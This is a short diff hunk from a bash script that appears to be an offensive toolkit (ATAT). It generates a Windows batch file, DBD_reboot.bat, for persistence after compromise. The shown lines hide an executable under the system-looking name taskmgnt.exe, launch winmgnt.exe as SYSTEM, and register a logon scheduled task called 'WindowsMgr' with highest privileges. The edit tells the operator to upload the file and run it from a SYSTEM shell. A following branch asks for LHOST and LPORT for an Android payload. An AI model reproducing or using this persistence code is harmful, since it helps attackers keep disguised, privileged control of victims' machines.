@@ -532,7 +532,7 @@ do
 			echo attrib +H +S \"%WINDIR%\\System32\\\taskmgnt.exe\" >> ~/ATAT/DBD_reboot.bat
 			echo %WINDIR%\\System32\\\taskmgnt.exe -i -d -s /accepteula %WINDIR%\\System32\\winmgnt.exe >> ~/ATAT/DBD_reboot.bat
 			echo schtasks /create /sc onlogon /tn WindowsMgr /rl highest /tr \"%WINDIR%\\System32\\winmgnt.exe\" >> ~/ATAT/DBD_reboot.bat
-            echo -e "\E[1;34m::::: \e[97mDBD_reboot.bat saved to ~/ATAT. Upload to device and run.\E[1;34m:::::" 
+            echo -e "\E[1;34m::::: \e[97mDBD_reboot.bat saved to ~/ATAT. Upload to device in %WINDIR%\System32\ and run from a SYSTEM shell in that same directory.\E[1;34m:::::" 
             ;; 
         "Android")
         read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport;
